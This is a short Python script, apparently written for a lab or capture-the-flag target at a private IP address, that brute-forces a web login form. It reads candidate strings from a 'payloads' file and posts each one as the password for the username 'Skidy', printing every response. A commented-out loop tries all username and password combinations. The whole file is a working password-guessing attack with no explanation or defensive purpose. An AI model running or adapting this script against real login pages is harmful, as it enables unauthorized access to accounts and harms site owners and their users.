#!/usr/bin/env python3 
import requests

url = "http://10.10.140.82/login/"

def logIn(username,password):
	req = requests.post(url,data={
		"username":username,
		"password":password,
		"submit": "Login",
		})
	return req
with open("payloads",'r') as f:
	usernames = [line.strip() for line in f.read().split("\n") ]

#print(usernames)
with open("payloads",'r') as f:
	passwords = [line.strip() for line in f.read().split("\n") ]

# for username in usernames:
# 	for password in passwords:
# 		response = logIn(username,password).text
# 		print(f"username:{username}:{password}->{response}")


for password in passwords:
	response = logIn("Skidy",password).text
	print(f"{password}$$\n{response}")


